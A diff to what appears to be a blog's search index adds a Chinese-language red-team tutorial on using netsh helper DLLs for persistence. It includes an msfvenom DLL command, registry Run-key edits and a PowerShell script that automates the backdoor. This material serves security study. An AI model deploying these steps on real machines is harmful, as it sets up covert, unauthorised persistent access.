@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>netsh后门</title>
+      <link href="/posts/b31575cf.html"/>
+      <url>/posts/b31575cf.html</url>
+      <content type="html"><![CDATA[<blockquote><p>Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红色团队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。</p></blockquote><p>通过msfvenom生成一个dll</p><pre><code>msfvenom -p widnows/x64/exec CMD=calc.exe -f dll &gt; test.dll</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/Mei1yV.png" alt="Mei1yV.png"></p><p>在受害机执行</p><pre><code>netsh add helper &lt;DLL_PATH&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/MeiUY9.png" alt="MeiUY9.png"></p><p>之后netsh一运行就会加载DLL（加载完DLL后自动运行netsh，关闭之后。再此之后执行的netsh都会加载dll）<br><img src="https://s2.ax1x.com/2019/11/08/MeiwS1.png" alt="MeiwS1.png"></p><p>如果要实现启动系统自动运行netsh，得修改注册表</p><pre><code> reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Windows\SysWOW64\netsh&quot;; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d &#39;C:\Windows\SysWOW64\netsh&#39;;</code></pre><p>这里我用powershell实现了一个简单的功能</p><pre><code class="powershell"> param (    [string]$path = &quot;NULL&quot; ) if($path -eq &quot;NULL&quot;){    Write-Host &quot;netsh.ps1 -path &lt;DLL_path&gt;&quot;;    exit(0); }else{    write-host &quot;[*] reboot run netsh&quot;;    reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Windows\SysWOW64\netsh&quot;;    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d &#39;C:\Windows\SysWOW64\netsh&#39;;    netsh add helper $path;}</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/Mei0Qx.png" alt=""></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 权限维持 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Powershell配置文件-持久性后门</title>
       <link href="/posts/3327c145.html"/>
       <url>/posts/3327c145.html</url>
